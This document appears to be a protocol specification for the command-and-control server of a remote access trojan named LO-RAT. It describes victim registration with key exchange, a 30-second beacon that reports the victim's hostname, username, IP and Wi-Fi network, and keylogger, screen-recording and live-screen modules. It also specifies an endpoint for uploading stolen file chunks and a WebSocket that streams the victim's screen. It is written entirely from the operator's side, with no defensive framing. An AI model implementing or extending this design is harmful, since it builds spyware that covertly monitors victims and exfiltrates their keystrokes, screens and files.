# LO-RAT C2 Protocol v1.0

## Authentication
- Victim generates RSA keypair on first run
- Sends public key to /register
- Server responds with victim UUID + AES session key
- All subsequent comms encrypted with AES-256-GCM

## Endpoints

### POST /beacon
Victim heartbeat. Sent every 30s.
Request:
{
  "uuid": "victim-uuid",
  "timestamp": 1718966400,
  "hostname": "DESKTOP-ABC123",
  "username": "john",
  "os": "Windows 11 23H2",
  "ip": "192.168.1.45",
  "wifi": "HomeNetwork_5G",
  "idle_time": 120,
  "modules": ["keylogger","screen_rec","live_screen"]
}

Response:
{
  "commands": [
    {"id": "cmd-001", "type": "live_screen", "params": {"quality": 80, "fps": 15}},
    {"id": "cmd-002", "type": "shutdown", "params": {"mode": "restart"}}
  ]
}

### POST /upload
Multipart form data. Encrypted file chunks.
Fields: uuid, cmd_id, filename, chunk_index, total_chunks, data

### GET /command/{uuid}
Long-polling alternative to beacon response.

### WebSocket /ws/screen/{uuid}
MJPEG stream from victim live screen module.
Binary frames: JPEG chunks